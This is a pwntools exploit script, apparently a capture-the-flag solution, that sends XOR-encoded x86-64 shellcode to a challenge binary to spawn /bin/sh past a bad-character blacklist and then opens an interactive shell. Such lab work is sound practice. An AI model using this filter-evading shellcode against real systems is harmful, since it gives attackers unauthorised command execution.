from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./execute')
if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    io = remote(ip, port)
else:
    io = process(elf.path)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
        
shellcode = '''    
mov rax, 0x1010101010101010
push rax
mov rax, 0x1078633f7e79723f
xor [rsp], rax
mov rdi, rsp

mov rsi, 0x0
mov rdx, 0x0

push 0x3c
pop rax
sub al, 0x1
syscall
'''

payload = asm(shellcode)
for byte in payload:
    if byte in blacklist:
        print(f'Bad Character\t 0x{byte:02x} -> ASCII value: {chr(byte)}')

io.sendline(payload)
io.interactive()